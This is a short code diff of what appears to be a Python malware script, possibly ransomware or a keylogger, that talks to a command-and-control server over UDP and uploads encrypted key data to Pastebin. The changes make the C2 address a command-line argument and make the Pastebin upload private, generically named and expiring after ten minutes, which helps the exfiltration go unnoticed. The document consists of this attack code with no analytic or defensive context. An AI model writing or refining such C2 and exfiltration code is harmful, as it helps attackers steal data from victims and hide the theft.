@@ -24,7 +24,8 @@ def key_thread():
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    C2_ip = "10.0.0.196" # C2 server IP
+    C2_ip = argv[1]
+    # C2_ip = "10.0.0.196" # C2 server IP
     C2_port = 10101 # C2 server port (mismatch due to port-fowarding)
     C2_addr = (C2_ip, C2_port)
     
@@ -91,8 +92,9 @@ def main():
     key_data = {'api_dev_key': dev_key,
                 'api_option': 'paste',
                 'api_paste_code': ciphertext,
-                'api_paste_private': 0,
-                'api_paste_name': 'key_test'}
+                'api_paste_private': 1,
+                'api_paste_name': 'Untitled',
+                'api_paste_expire_date': '10M'}
     # key_url = requests.post(url=pastebin_url, data=key_data)
 
     print(key_url.text)  # print out url of paste
